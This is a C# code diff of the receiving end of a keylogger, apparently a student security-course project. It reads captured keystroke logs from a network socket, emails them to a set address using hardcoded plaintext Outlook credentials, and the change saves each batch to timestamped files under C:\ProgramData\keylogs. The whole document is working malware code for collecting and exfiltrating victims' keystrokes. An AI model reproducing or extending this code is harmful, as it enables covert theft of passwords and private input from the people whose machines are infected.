@@ -11,7 +11,7 @@ namespace Networking
         private const string FROM_EMAIL_ADDRESS = "cmsc414dummy@outlook.com";
         private const string FROM_EMAIL_PASSWORD = "414dummy";
         private const string TO_EMAIL_ADDRESS = "smithcl6@vcu.edu";
-        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
+       // private static string LOG_FILE_NAME = @"C:\ProgramData"+ DateTime.Now +".txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
@@ -33,8 +33,27 @@ namespace Networking
                 string log = System.Text.Encoding.ASCII.GetString(buffer, 0, bytesRead);
                 Console.WriteLine("Message Received:" + log);
                 sendMail(log);
-                
-                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
+
+                // // specify the file path and name
+                // // create a new file
+                // using (FileStream fs = File.Create(filePath))
+                // {
+                    
+                // }
+                DateTime now = DateTime.Now;
+                string formattedDateTime = now.ToString("yyyy-MM-dd-HH-mm-ss");
+
+                if (!Directory.Exists(@"C:\ProgramData\keylogs\"))
+                {
+                    Directory.CreateDirectory(@"C:\ProgramData\keylogs\");
+                    Console.WriteLine("Directory created");
+                }
+                else
+                {
+                    Console.WriteLine("Directory already exists");
+                }
+
+                StreamWriter output = new StreamWriter(@"C:\ProgramData\keylogs\"+ formattedDateTime +".txt", true);
                 output.Write(log);
                 output.Close();
 
